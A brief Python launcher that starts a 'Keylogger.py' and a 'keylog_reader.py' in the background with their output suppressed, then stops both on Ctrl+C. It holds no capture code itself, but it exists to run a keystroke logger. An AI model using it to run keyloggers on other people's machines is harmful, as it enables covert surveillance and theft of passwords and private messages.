import subprocess
import sys
import time

print("🚀 Starting Keylogger + Real-time Reader...\n")

try:
    keylogger = subprocess.Popen(
        [sys.executable, "Keylogger.py"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    print("✅ Keylogger started")

except Exception as e:
    print(f"❌ Failed to start Keylogger: {e}")
    sys.exit(1)


time.sleep(1)


try:
    reader = subprocess.Popen(
        [sys.executable, "keylog_reader.py"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    print("✅ Real-time Reader started")

except Exception as e:
    print(f"❌ Failed to start Reader: {e}")


print("\nBoth programs are running. Press Ctrl+C to stop.\n")


try:
    while True:
        time.sleep(1)

except KeyboardInterrupt:

    print("\nShutting down...")

    keylogger.terminate()
    reader.terminate()

    print("Done.")